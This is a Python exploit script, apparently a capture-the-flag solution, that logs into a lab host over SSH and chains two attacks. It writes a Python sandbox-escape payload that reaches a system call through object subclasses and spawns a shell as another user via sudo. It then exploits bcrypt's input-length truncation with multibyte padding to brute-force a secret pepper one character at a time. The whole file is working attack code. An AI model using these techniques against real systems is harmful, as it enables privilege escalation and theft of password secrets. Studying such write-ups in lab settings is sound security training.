#!/usr/bin/env python3

import bcrypt

from pwn import log, ssh, string


def lateral_movement(shell):
    shell.sendlineafter(b'$', b'''echo 'print(().__class__.__base__.__subclasses__()[137].__init__.__globals__["system"]("bash"))' > /tmp/a.py''')
    shell.sendlineafter(b'$', b'sudo -u jack_adm /usr/bin/safe_python /tmp/a.py')
    assert b'jack_adm' in shell.recvuntil(b'@')

    log.success('Got shell as `jack_adm`')


def extract_pepper(shell):
    pepper = ''

    payload_prog = log.progress('Payload')
    pepper_prog = log.progress('Pepper')

    found = True

    while found:
        found = False

        length_utf8 = (71 - len(pepper)) // 6
        length_ascii = (71 - len(pepper)) - length_utf8 * 6

        payload = '⚡️' * length_utf8 + 'A' * length_ascii
        payload_prog.status(payload)

        shell.sendlineafter(b'$', b'sudo /opt/hash_system/hash_password.py')
        shell.sendlineafter(b'Enter Password> ', payload.encode())
        shell.recvuntil(b'[+] Hash: ')
        password_hash = shell.recvline().strip()

        for c in string.printable:
            pepper_prog.status(pepper + c)

            if bcrypt.checkpw((payload + pepper + c).encode(), password_hash):
                pepper += c
                found = True
                break

    payload_prog.success(payload)
    pepper_prog.success(pepper)


def main():
    shell = ssh(host='10.10.11.184', user='jack', keyfile='id_rsa').process('bash')

    lateral_movement(shell)
    extract_pepper(shell)


if __name__ == '__main__':
    main()
